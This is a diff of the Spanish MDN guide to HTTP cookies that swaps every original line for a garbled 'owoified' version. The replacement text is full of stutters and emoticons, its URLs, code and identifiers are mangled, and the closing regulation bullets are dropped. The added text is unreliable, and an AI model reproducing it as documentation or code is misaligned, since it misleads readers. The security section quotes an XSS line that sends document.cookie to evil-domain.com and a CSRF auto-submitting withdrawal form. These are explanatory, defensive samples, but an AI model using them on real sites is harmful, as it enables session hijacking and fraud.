@@ -1,236 +1,236 @@
 ---
-title: HTTP cookies
-slug: Web/HTTP/Guides/Cookies
-original_slug: Web/HTTP/Cookies
+titwe: http cookies
+swug: web/http/guides/cookies
+o-owiginaw_swug: w-web/http/cookies
 ---
 
-{{HTTPSidebar}}
+{{httpsidebaw}}
 
-Una cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.
+u-una cookie h-http, (ꈍᴗꈍ) cookie w-web o cookie d-de nyavegadow es u-una pequeña pieza d-de datos que un sewvidow envía a ew nyavegadow web dew usuawio. σωσ ew nyavegadow g-guawda estos datos y wos envía de wegweso junto c-con wa nyueva petición aw mismo s-sewvidow. UwU was cookies se usan genewawmente pawa deciwwe aw s-sewvidow que dos peticiones tienen s-su owigen en e-ew mismo nyavegadow web wo que pewmite, ^•ﻌ•^ pow ejempwo, mya mantenew wa sesión de un usuawio a-abiewta. /(^•ω•^) was cookies pewmiten wecowdaw wa infowmación de estado en vista a-a que ew pwotocowo http es un pwotocowo s-sin estado. rawr
 
-Las cookies se utilizan principalmente con tres propósitos:
+w-was cookies s-se utiwizan pwincipawmente c-con twes pwopósitos:
 
-- Gestión de Sesiones
-  - : Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar
-- Personalización
-  - : Preferencias de usuario, temas y otras configuraciones
-- Rastreo
-  - : Guardar y analizar el comportamiento del usuario
+- gestión de s-sesiones
+  - : inicios de sesión, nyaa~~ cawwitos de c-compwas, ( ͡o ω ͡o ) puntajes de juegos o cuawquiew otwa cosa que ew sewvidow deba wecowdaw
+- pewsonawización
+  - : p-pwefewencias de usuawio, σωσ t-temas y otwas c-configuwaciones
+- w-wastweo
+  - : guawdaw y anawizaw ew compowtamiento dew usuawio
 
-Las cookies se usaron una vez para el almacenamiento general del lado del cliente. Si bien esto era legítimo cuando eran la única forma de almacenar datos en el cliente, hoy en día se recomienda preferir las API de almacenamiento modernas. Las cookies se envían con cada solicitud, por lo que pueden empeorar el rendimiento (especialmente para las conexiones de datos móviles). Las APIs modernas para el almacenamiento del cliente son la [Web storage API](/es/docs/Web/API/Web_Storage_API) (`localStorage` y `sessionStorage`) e [IndexedDB](/es/docs/Web/API/IndexedDB_API).
+w-was cookies se u-usawon una vez pawa ew awmacenamiento g-genewaw d-dew wado dew cwiente. (✿oωo) si bien esto e-ewa wegítimo cuando ewan wa única f-fowma de awmacenaw datos en ew cwiente, (///ˬ///✿) hoy e-en día se wecomienda pwefewiw w-was api de awmacenamiento modewnas. σωσ w-was cookies s-se envían con cada sowicitud, UwU pow wo que pueden empeowaw ew wendimiento (especiawmente pawa was conexiones de datos móviwes). (⑅˘꒳˘) w-was apis modewnas p-pawa ew awmacenamiento dew cwiente s-son wa [web s-stowage api](/es/docs/web/api/web_stowage_api) (`wocawstowage` y-y `sessionstowage`) e [indexeddb](/es/docs/web/api/indexeddb_api). /(^•ω•^)
 
-> [!NOTE]
-> Para ver las cookies almacenadas (y otro tipo de almacenamiento que una página web puede usar), puede habilitar el [Inspector de Almacenamiento](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) en Herramientas del desarrollador y seleccionar Cookies en el árbol de almacenamiento.
+> [!note]
+> pawa vew was cookies awmacenadas (y o-otwo tipo de awmacenamiento que una página web puede usaw), -.- puede habiwitaw e-ew [inspectow de awmacenamiento](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw) e-en hewwamientas d-dew desawwowwadow y-y seweccionaw cookies e-en ew áwbow de a-awmacenamiento.
 
-## Creando cookies
+## c-cweando cookies
 
-Al recibir una solicitud HTTP, un servidor puede enviar un encabezado {{HTTPHeader ("Set-Cookie")}} con la respuesta. La cookie generalmente es almacenada por el navegador, y luego la cookie se envía con solicitudes hechas al mismo servidor dentro de un encabezado HTTP {{HTTPHeader ("Cookie")}}. Se puede especificar una fecha de vencimiento o duración, después de lo cual ya no se envía la cookie. Además, se pueden establecer restricciones a un dominio y ruta específicos, lo que limita el lugar donde se envía la cookie.
+a-aw wecibiw una sowicitud http, (ˆ ﻌ ˆ)♡ un sewvidow p-puede enviaw un e-encabezado {{httpheadew ("set-cookie")}} c-con wa w-wespuesta. nyaa~~ wa cookie g-genewawmente es awmacenada pow ew nyavegadow, ʘwʘ y wuego wa cookie s-se envía con sowicitudes hechas aw mismo sewvidow dentwo de un encabezado http {{httpheadew ("cookie")}}. s-se puede especificaw una fecha de vencimiento o duwación, :3 después d-de wo cuaw ya n-nyo se envía w-wa cookie. (U ᵕ U❁) además, se pueden estabwecew w-westwicciones a un dominio y-y wuta específicos, (U ﹏ U) w-wo que wimita ew wugaw donde se envía wa cookie. ^^
 
-### Los encabezados `Set-Cookie` y `Cookie`
+### wos encabezados `set-cookie` y `cookie`
 
-El encabezado de respuesta HTTP {{HTTPHeader ("Set-Cookie")}} envía las cookies del servidor al agente de usuario. Una cookie simple se establece así:
+e-ew encabezado de wespuesta h-http {{httpheadew ("set-cookie")}} envía was c-cookies dew sewvidow a-aw agente de usuawio. òωó una cookie simpwe se e-estabwece así:
 
 ```
-Set-Cookie: <nombre-cookie>=<valor-cookie>
+s-set-cookie: <nombwe-cookie>=<vawow-cookie>
 ```
 
-Este encabezado del servidor le dice al cliente que almacene una cookie.
+este encabezado d-dew sewvidow w-we dice aw cwiente que awmacene una cookie. /(^•ω•^)
 
-> [!NOTE]
-> Aquí se explica como usar el encabezado `Set-Cookie` en varias aplicaciones del lado del servidor:
+> [!note]
+> aquí se expwica como u-usaw ew encabezado `set-cookie` e-en vawias apwicaciones d-dew wado dew sewvidow:
 >
-> - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
-> - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
-> - [Python](https://docs.python.org/3/library/http.cookies.html)
-> - [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
+> - [php](https://secuwe.php.net/manuaw/en/function.setcookie.php)
+> - [node.js](https://nodejs.owg/dist/watest-v8.x/docs/api/http.htmw#http_wesponse_setheadew_name_vawue)
+> - [python](https://docs.python.owg/3/wibwawy/http.cookies.htmw)
+> - [wuby o-on waiws](http://api.wubyonwaiws.owg/cwasses/actiondispatch/cookies.htmw)
 
 ```
-HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: yummy_cookie=choco
-Set-Cookie: tasty_cookie=strawberry
+h-http/1.0 200 ok
+content-type: t-text/htmw
+set-cookie: yummy_cookie=choco
+set-cookie: tasty_cookie=stwawbewwy
 
 [page content]
 ```
 
-Ahora, con cada nueva solicitud al servidor, el navegador enviará todas las cookies almacenadas previamente al servidor utilizando el encabezado {{HTTPHeader ("Cookie")}}.
+ahowa, 😳😳😳 c-con cada nyueva s-sowicitud aw sewvidow, :3 ew nyavegadow enviawá todas w-was cookies a-awmacenadas pweviamente aw sewvidow utiwizando ew encabezado {{httpheadew ("cookie")}}. (///ˬ///✿)
 
 ```
-GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+g-get /sampwe_page.htmw http/1.1
+host: www.exampwe.owg
+cookie: yummy_cookie=choco; tasty_cookie=stwawbewwy
 ```
 
-### Cookies de sesión
+### cookies de sesión
 
-La cookie creada anteriormente es una cookie de sesión: se elimina cuando el cliente se cierra, por que no se especificó una directiva `Expires` o `Max-Age` . Sin embargo, los navegadores web pueden usar la **restauración de sesiones**, lo que hace que la mayoría de las cookies de sesión sean permanentes, como si el navegador nunca se cerrara.
+w-wa cookie cweada antewiowmente es una cookie d-de sesión: se e-ewimina cuando ew cwiente se ciewwa, rawr x3 pow que nyo se especificó u-una diwectiva `expiwes` o-o `max-age` . (U ᵕ U❁) sin embawgo, (⑅˘꒳˘) wos nyavegadowes web pueden usaw w-wa **westauwación de sesiones**, (˘ω˘) w-wo que hace que wa mayowía de was cookies de sesión sean p-pewmanentes, :3 como si ew nyavegadow n-nyunca se cewwawa. XD
 
-### Cookies Permanentes
+### c-cookies pewmanentes
 
-En lugar de expirar cuando el cliente se cierra, las _cookies permanentes_ expiran en una fecha específica (`Expires`) o tras un periodo de tiempo específico (`Max-Age`).
-
-```
-Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
-```
-
-> [!NOTE]
-> Cuando se establece una fecha de expiración, la fecha y hora que se establece es relativa al cliente en el que se establece la cookie, no del servidor.
-
-### Cookies `Secure` y `HttpOnly`
-
-Una cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.
-
-Para prevenir ataques cross-site scripting ([XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss)), las cookies `HttpOnly` son inaccesibles desde la API de Javascript {{domxref("Document.cookie")}}; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.
+e-en wugaw de expiwaw cuando ew cwiente s-se ciewwa, >_< w-was _cookies pewmanentes_ e-expiwan en una fecha e-específica (`expiwes`) o-o twas un pewiodo de tiempo específico (`max-age`). (✿oωo)
 
 ```
-Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+s-set-cookie: id=a3fwa; e-expiwes=wed, (ꈍᴗꈍ) 21 o-oct 2015 07:28:00 gmt;
 ```
 
-### Alcance de las cookies
+> [!note]
+> cuando se estabwece u-una fecha de expiwación, XD wa f-fecha y howa que s-se estabwece es wewativa aw cwiente en ew que se estabwece wa c-cookie, :3 nyo dew s-sewvidow. mya
 
-Las directivas `Domain` y `Path` definen el alcance de la cookie: a qué URLs deberían enviarse las cookies.
+### c-cookies `secuwe` y-y `httponwy`
 
-`Domain` especifica los hosts permitidos para recibir la cookie. Si no se especifica, toma como valor por defecto el [host del Document.location actual,](/es/docs/Web/API/Document/location) **excluyendo subdominios**. Si se especifica `Domain`, los subdominios son siempre incluidos.
+una cookie seguwa s-sówo se envía aw sewvidow con una petición cifwada sobwe ew pwotocowo https. òωó incwuso con `secuwe`, nyaa~~ n-nyo debewía awmacenawse _nunca_ i-infowmación sensibwe en w-wa cookies, 🥺 ya que son inhewentemente i-inseguwas y este fwag nyo p-puede ofwecew pwotección w-weaw. -.- a-a pawtiw de chwome 52 y-y fiwefox 52, 🥺 w-wos sitios inseguwos (`http:`) nyo pueden estabwecew cookies con wa diwectiva `secuwe`. (˘ω˘)
 
-Por ejemplo, si se establece `Domain=mozilla.org`, las cookies se incluyen en subdominios como `developer.mozilla.org`.
+pawa pweveniw ataques c-cwoss-site scwipting ([xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss)), òωó w-was cookies `httponwy` s-son inaccesibwes desde w-wa api de javascwipt {{domxwef("document.cookie")}}; sowamente se envían aw sewvidow. UwU pow ejempwo, ^•ﻌ•^ w-was cookies q-que pewsisten sesiones dew wado d-dew sewvidow nyo nyecesitan estaw disponibwes pawa j-javascwipt, mya p-pow wo que debewía estabwecewse e-ew fwag `httponwy`. (✿oωo)
 
-`Path` indica una ruta URL que debe existir en la URL solicitada para enviar el header. El carácter %x2F ("/") es considerado un separador de directorios, y los subdirectorios también coincidirán.
+```
+s-set-cookie: id=a3fwa; expiwes=wed, XD 21 oct 2015 07:28:00 gmt; secuwe; httponwy
+```
 
-Por ejemplo, si se establece `Path=/docs` estas rutas coincidirán:
+### a-awcance de was c-cookies
+
+was diwectivas `domain` y-y `path` definen e-ew awcance de w-wa cookie: a qué uwws debewían e-enviawse was cookies. :3
+
+`domain` e-especifica wos hosts pewmitidos p-pawa wecibiw wa c-cookie. (U ﹏ U) si nyo se especifica, UwU toma c-como vawow pow defecto ew [host dew document.wocation a-actuaw,](/es/docs/web/api/document/wocation) **excwuyendo subdominios**. ʘwʘ s-si se especifica `domain`, >w< w-wos subdominios son s-siempwe incwuidos. 😳😳😳
+
+pow ejempwo, rawr si se estabwece `domain=moziwwa.owg`, ^•ﻌ•^ w-was cookies s-se incwuyen e-en subdominios como `devewopew.moziwwa.owg`. σωσ
+
+`path` indica una wuta uww que debe e-existiw en wa uww sowicitada pawa enviaw ew headew. :3 e-ew cawáctew %x2f ("/") es c-considewado un sepawadow de diwectowios, rawr x3 y-y wos subdiwectowios t-también coincidiwán. nyaa~~
+
+p-pow ejempwo, :3 si se estabwece `path=/docs` estas wutas coincidiwán:
 
 - `/docs`
-- `/docs/Web/`
-- `/docs/Web/HTTP`
+- `/docs/web/`
+- `/docs/web/http`
 
-### Cookies `SameSite` {{experimental_inline}}
+### c-cookies `samesite` {{expewimentaw_inwine}}
 
-Las cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde {{Glossary("Site")}} es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery ({{Glossary("CSRF")}}).
+was cookies `samesite` pewmiten a wos s-sewvidowes wequewiw q-que una cookie no sea enviada c-con sowicitudes cwoss-site (donde {{gwossawy("site")}} e-es definido p-pow ew dominio w-wegistwabe), >w< wo que pwopowciona awgo de pwotección contwa ataques cwoss-site wequest fowgewy ({{gwossawy("cswf")}}). rawr
 
-Las cookies `SameSite` son relativamente nuevas y [soportadas por los principales navegadores](/es/docs/Web/HTTP/Reference/Headers/Set-Cookie#browser_compatibility).
+was cookies `samesite` son wewativamente nyuevas y [sopowtadas pow wos pwincipawes nyavegadowes](/es/docs/web/http/wefewence/headews/set-cookie#bwowsew_compatibiwity). 😳
 
-Aquí hay un ejemplo:
+aquí hay un ejempwo:
 
 ```
-Set-Cookie: key=value; SameSite=Strict
+set-cookie: k-key=vawue; s-samesite=stwict
 ```
 
-El atributo same-site puede tomar uno de los dos valores (case-insensitive):
+ew atwibuto same-site p-puede tomaw uno d-de wos dos vawowes (case-insensitive):
 
-- `Strict`
-  - : Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie. Si la solicitud se originó desde una URL diferente que la URL del location actual, no se incluirá ninguna cookie etiquetada con el atributo `Strict`.
-- `Lax`
-  - : Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames, pero se enviarán cuando un usuario navegue a la URL desde un sitio externo, por ejemplo, siguiendo un enlace.
+- `stwict`
+  - : s-si una cookie same-site t-tiene este atwibuto, 😳 ew nyavegadow s-sówo enviawá c-cookies si wa sowicitud se owiginó e-en ew sitio web que estabweció w-wa cookie. 🥺 s-si wa sowicitud se owiginó desde una uww difewente q-que wa uww d-dew wocation actuaw, rawr x3 n-nyo se incwuiwá n-nyinguna c-cookie etiquetada c-con ew atwibuto `stwict`. ^^
+- `wax`
+  - : s-si ew a-atwibuto se estabwece e-en wax, ( ͡o ω ͡o ) was cookies same-site s-se wetienen e-en (sub)peticiones c-cwoss-site, XD tawes como wwamadas p-pawa cawgaw imágenes o fwames, ^^ pewo se enviawán c-cuando un usuawio navegue a-a wa uww desde un s-sitio extewno, (⑅˘꒳˘) p-pow ejempwo, (⑅˘꒳˘) siguiendo un enwace. ^•ﻌ•^
 
-El comportamiento por defecto de este flag si no está establecido, o no está soportado por el navegador, es incluir las cookies en cualquier solicitud, incluyendo solicitudes corss-origin.
+e-ew compowtamiento pow defecto d-de este fwag si nyo está estabwecido, ( ͡o ω ͡o ) o-o nyo está sopowtado pow e-ew nyavegadow, es incwuiw was cookies en cuawquiew sowicitud, ( ͡o ω ͡o ) incwuyendo sowicitudes c-cowss-owigin. (✿oωo)
 
-### Acceso desde JavaScript usando `Document.cookie`
+### acceso d-desde javascwipt u-usando `document.cookie`
 
-También se pueden crear nuevas cookies via JavaScript usando la propiedad {{domxref("Document.cookie")}}, y si el flag `HttpOnly` no está establecido, también se puede acceder a las cookies existentes desde JavaScript.
+también se pueden cweaw nyuevas cookies v-via javascwipt usando wa pwopiedad {{domxwef("document.cookie")}}, 😳😳😳 y-y si ew f-fwag `httponwy` n-nyo está estabwecido, OwO también se puede accedew a-a was cookies e-existentes desde javascwipt. ^^
 
 ```js
-document.cookie = "yummy_cookie=choco";
-document.cookie = "tasty_cookie=strawberry";
-console.log(document.cookie);
-// logs "yummy_cookie=choco; tasty_cookie=strawberry"
+d-document.cookie = "yummy_cookie=choco";
+document.cookie = "tasty_cookie=stwawbewwy";
+consowe.wog(document.cookie);
+// w-wogs "yummy_cookie=choco; tasty_cookie=stwawbewwy"
 ```
 
-Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad](#security). Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.
+t-tenga en cuenta w-was cuestiones d-de seguwidad en wa siguiente sección [seguwidad](#secuwity). rawr x3 was c-cookies disponibwes p-pawa javascwipt p-pueden sew w-wobadas pow medio de xss. 🥺
 
-## Seguridad
+## s-seguwidad
 
-> [!NOTE]
-> Nunca se debe almacenar ni transmitir información confidecial o sensible mediante Cookies HTTP, ya que todo el mecanismo es inherentemente inseguro.
+> [!note]
+> n-nyunca se d-debe awmacenaw n-nyi twansmitiw infowmación c-confideciaw o-o sensibwe m-mediante cookies h-http, (ˆ ﻌ ˆ)♡ ya que todo ew mecanismo e-es inhewentemente inseguwo. ( ͡o ω ͡o )
 
-### Secuestro de session y XSS
+### s-secuestwo de session y xss
 
-Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad [XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss) de la aplicación.
+w-was cookies son u-utiwizadas a menudo e-en apwicaciones web pawa identificaw a un usuawio y su sesión a-autenticada, >w< a-así que ew wobo d-de una cookie puede impwicaw ew secuestwo de wa sesión dew usuawio a-autenticado. /(^•ω•^) w-was fowmas más comunes de wobaw c-cookies incwuyen i-ingeniewía sociaw o wa expwotación de una vuwnewabiwidad [xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss) d-de wa apwicación. 😳😳😳
 
 ```js
-new Image().src =
-  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+n-nyew image().swc =
+  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + d-document.cookie;
 ```
 
-El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.
+e-ew atwibuto cookie `httponwy` puede ayudaw a mitigaw este ataque e-evitando ew a-acceso aw vawow de wa cookie a twavés de javascwipt. (U ᵕ U❁)
 
-### Cross-site request forgery (CSRF)
+### c-cwoss-site wequest fowgewy (cswf)
 
-[Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona buenos ejemplos para {{Glossary("CSRF")}}. En este caso, alguien puede incluir una imagen que no es realmente una imagen (por ejemplo un chat o foro sin filtrar), que en lugar de esto es realmente una solicitud de tu banco para retirar tu dinero:
+[wikipedia](https://en.wikipedia.owg/wiki/http_cookie#cwoss-site_wequest_fowgewy) menciona buenos e-ejempwos pawa {{gwossawy("cswf")}}. (˘ω˘) en este caso, 😳 a-awguien puede i-incwuiw una imagen que nyo es weawmente u-una imagen (pow e-ejempwo un chat o fowo sin f-fiwtwaw), (ꈍᴗꈍ) que en wugaw de esto e-es weawmente una s-sowicitud de t-tu banco pawa wetiwaw t-tu dinewo:
 
-```html
+```htmw
 <img
-  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
+  swc="http://bank.exampwe.com/withdwaw?account=bob&amount=1000000&fow=mawwowy" />
 ```
 
-Ahora, si tu tienes una sesión iniciada en tu tu cuenta bancaria y las cookies permanecen siendo válidas (y no hay otra validación mas que esa), se realizará la transferencia desde tu cuenta tan pronto como se cargue el html que contiene la imagen. Para los endpoints que requieren una petición de tipo POST, se puede disparar un evento de tipo envío de formulario (posiblemente en un iframe invisible) cuando la página se carga:
+a-ahowa, :3 si t-tu tienes una sesión i-iniciada en tu tu cuenta b-bancawia y was cookies pewmanecen siendo váwidas (y n-nyo hay otwa v-vawidación mas q-que esa), /(^•ω•^) se weawizawá wa twansfewencia desde tu cuenta tan pwonto como se cawgue e-ew htmw que contiene wa imagen. ^^;; p-pawa wos endpoints q-que wequiewen una petición de tipo post, o.O s-se puede dispawaw un evento de t-tipo envío de f-fowmuwawio (posibwemente e-en un ifwame i-invisibwe) c-cuando wa página se cawga:
 
-```html
-<form action="https://bank.example.com/withdraw" method="POST">
-  <input type="hidden" name="account" value="bob" />
-  <input type="hidden" name="amount" value="1000000" />
-  <input type="hidden" name="for" value="mallory" />
-</form>
-<script>
-  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
-</script>
+```htmw
+<fowm action="https://bank.exampwe.com/withdwaw" method="post">
+  <input type="hidden" nyame="account" v-vawue="bob" />
+  <input type="hidden" n-name="amount" vawue="1000000" />
+  <input type="hidden" nyame="fow" v-vawue="mawwowy" />
+</fowm>
+<scwipt>
+  window.addeventwistenew('domcontentwoaded', 😳 (e) => { document.quewysewectow('fowm').submit(); }
+</scwipt>
 ```
 
-Se presentan aquí algunas técnicas que se deberían usar para evitar que estas cosas ocurran:
+se pwesentan aquí awgunas t-técnicas q-que se debewían usaw pawa evitaw q-que estas cosas ocuwwan:
 
-- Los endpoints GET no deben tener acciones de modificación, y si esto se necesita se debería requerir una petición POST. Además los endpoints POST no debería aceptar la intercambiabilidad de aceptar peticiones GET con parametros en _query string_
-- Un token CSRF debería ser incluido en cada elemento `<form>` mediante un input oculto. Este token debe ser único para cada usuario y almacenado (por ejemplo, en una _cookie_). De esta forma el servidor puede mirar si el valor requerido es enviado, y en cierto modo lo idea sería descartar la petición si el valor no concuerda con lo esperado.
+- wos endpoints get n-nyo deben tenew a-acciones de modificación, UwU y si e-esto se nyecesita se debewía wequewiw u-una petición post. >w< además wos endpoints post nyo debewía a-aceptaw wa intewcambiabiwidad de aceptaw peticiones get con p-pawametwos en _quewy s-stwing_
+- un t-token cswf debewía sew incwuido en cada ewemento `<fowm>` m-mediante un input ocuwto. o.O este token debe sew único pawa cada usuawio y-y awmacenado (pow e-ejempwo, (˘ω˘) en u-una _cookie_). òωó d-de esta fowma ew sewvidow puede miwaw si ew vawow w-wequewido es e-enviado, nyaa~~ y en ciewto modo wo idea sewía descawtaw w-wa petición si ew vawow nyo concuewda con wo e-espewado. ( ͡o ω ͡o )
 
-  - Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.
+  - este método de pwotección wecae e-en wa imposibiwidad d-de que un atacante pueda pwedeciw e-este token a-autogenewado e-en cada inicio de sesión. 😳😳😳 cabe acwawaw que este t-token debewía sew wegenewado en cada inicio de s-sesión. ^•ﻌ•^
 
-- Al igual que con [XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss), el filtrado de entrada es importante.
-- Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
-- Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.
-- Para más prevención visita [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>).
+- aw iguaw que con [xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss), (˘ω˘) ew fiwtwado de entwada es i-impowtante. (˘ω˘)
+- debewía d-de existiw s-siempwe un wequewimiento d-de confiwmación p-pawa cuawquiew acción d-dewicada,.
+- was cookies empweadas en acciones d-dewicadas debewían de tenew una v-vida útiw bweve. -.-
+- pawa más pwevención visita [owasp c-cswf p-pwevention cheat sheet](<https://www.owasp.owg/index.php/cwoss-site_wequest_fowgewy_(cswf)_pwevention_cheat_sheet>). ^•ﻌ•^
 
-## Rastreo y privacidad
+## w-wastweo y pwivacidad
 
-### Cookies de terceros
+### c-cookies de tewcewos
 
-Las Cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la página en la que el cliente se encuentra, se llama _cookie de origen_. Si el dominio es distinto, se denomina _cookie de terceros_. Si bien las cookies de origen se envían únicamente al servidor que las configura, una página web puede contener imágenes u otros componentes almacenados en servidores de otros dominios (como publicidad). Las cookies que se envían a través de estos componentes de terceros se utilizan principalmente para publicidad y seguimiento en la web. Por ejemplo, [los tipos de cookies utilizadas por Google](https://www.google.com/policies/technologies/types/).
+w-was cookies tienen un dominio a-asociado a e-ewwas. /(^•ω•^) si este dominio es ew mismo q-que ew dominio de wa página en wa que ew cwiente se encuentwa, (///ˬ///✿) s-se wwama _cookie de owigen_. mya s-si ew dominio es distinto, o.O se denomina _cookie de tewcewos_. ^•ﻌ•^ si b-bien was cookies d-de owigen se envían únicamente a-aw sewvidow que was configuwa, (U ᵕ U❁) u-una página web p-puede contenew imágenes u otwos c-componentes awmacenados en sewvidowes d-de otwos dominios (como p-pubwicidad). :3 was c-cookies que se envían a twavés de estos componentes de tewcewos se utiwizan p-pwincipawmente pawa p-pubwicidad y seguimiento en wa web. (///ˬ///✿) pow ejempwo, (///ˬ///✿) [wos tipos d-de cookies utiwizadas pow googwe](https://www.googwe.com/powicies/technowogies/types/). 🥺
 
-Un servidor de terceros puede crear un perfil del historial y los hábitos de navegación de un usuario basándose en las cookies que le envía el mismo navegador al acceder a varios sitios. Firefox, de forma predeterminada, bloquea las cookies de terceros que se sabe que contienen rastreadores. Las cookies de terceros (o simplemente las cookies de seguimiento) también pueden bloquearse mediante otras configuraciones o extensiones del navegador. El bloqueo de cookies puede provocar que algunos componentes de terceros (como los widgets de redes sociales) no funcionen según lo previsto.
+u-un sewvidow d-de tewcewos puede cweaw un pewfiw dew histowiaw y wos hábitos de nyavegación d-de un usuawio basándose en was cookies que w-we envía ew mismo nyavegadow aw a-accedew a vawios s-sitios. -.- fiwefox, nyaa~~ de fowma pwedetewminada, (///ˬ///✿) b-bwoquea w-was cookies d-de tewcewos que s-se sabe que contienen w-wastweadowes. 🥺 w-was cookies de tewcewos (o simpwemente was cookies de seguimiento) también pueden bwoqueawse m-mediante otwas c-configuwaciones o-o extensiones dew n-nyavegadow. >w< ew b-bwoqueo de cookies p-puede pwovocaw que awgunos componentes de tewcewos (como wos widgets de wedes s-sociawes) nyo f-funcionen según wo pwevisto. rawr x3
 
-Hay algunas funciones útiles disponibles para los desarrolladores que desean respetar la privacidad del usuario y minimizar el seguimiento de terceros:
+hay awgunas funciones útiwes disponibwes p-pawa wos d-desawwowwadowes q-que desean wespetaw wa pwivacidad dew usuawio y-y minimizaw ew seguimiento de tewcewos:
 
-- Los servidores pueden (y deberían) configurar el atributo SameSite para especificar si se pueden enviar o no cookies de terceros.
-- Las cookies que tienen un estado de partición independiente (CHIPS) les permiten a los desarrolladores habilitar sus cookies en el almacenamiento particionado, con un contenedor de cookies separado por sitio de nivel superior. Esto permite que los usos válidos sin seguimiento de cookies de terceros sigan funcionando en navegadores que no permiten el uso de cookies para el seguimiento de terceros.
+- wos s-sewvidowes pueden (y d-debewían) configuwaw ew atwibuto samesite p-pawa especificaw si se pueden enviaw o-o nyo cookies d-de tewcewos. (⑅˘꒳˘)
+- was cookies que t-tienen un estado d-de pawtición i-independiente (chips) w-wes pewmiten a-a wos desawwowwadowes h-habiwitaw sus cookies e-en ew awmacenamiento p-pawticionado, σωσ con un contenedow d-de cookies sepawado pow sitio de nyivew supewiow. XD e-esto pewmite que wos usos v-váwidos sin seguimiento de cookies d-de tewcewos s-sigan funcionando en nyavegadowes que nyo pewmiten e-ew uso de cookies pawa ew seguimiento de tewcewos. -.-
 
-## Regulaciones relacionadas a las cookies
+## w-weguwaciones w-wewacionadas a was cookies
 
-La legislación o normativa que cubre el uso de cookies incluye:
+wa wegiswación o-o nyowmativa q-que cubwe ew uso de cookies incwuye:
 
-- El Reglamento General de Privacidad de Datos (RGPD) en la Unión Europea
-- La Directiva sobre la privacidad electrónica en la Unión Europea
-- Ley de Privacidad del Consumidor de California (CCPA)
+- e-ew wegwamento genewaw de pwivacidad de d-datos (wgpd) en w-wa unión euwopea
+- wa diwectiva s-sobwe wa pwivacidad e-ewectwónica en wa unión euwopea
+- wey de p-pwivacidad dew consumidow d-de cawifownia (ccpa)
 
-Estas regulaciones tienen alcance global. Se aplican a cualquier sitio del internet al que accedan usuarios de estas jurisdicciones (la UE y California, con la salvedad de que la ley de California se aplica sólo a entidades con ingresos brutos superiores a 25 millones de dólares, entre otras cosas).
+e-estas weguwaciones t-tienen awcance gwobaw. >_< se apwican a cuawquiew sitio dew intewnet aw que accedan usuawios de estas juwisdicciones (wa u-ue y cawifownia, rawr c-con wa s-sawvedad de que w-wa wey de cawifownia s-se apwica sówo a-a entidades con ingwesos bwutos s-supewiowes a-a 25 miwwones de dówawes, 😳😳😳 entwe o-otwas cosas). UwU
 
-Estas regulaciones incluyen requisitos tales como:
+e-estas weguwaciones incwuyen wequisitos tawes como:
 
-- Notificar a los usuarios que el sitio utiliza cookies.
-- Permitir a los usuarios escoger no recibir algunas o todas las cookies.
-- Permitir a los usuarios utilizar la mayor parte del servicio sin recibir cookies.
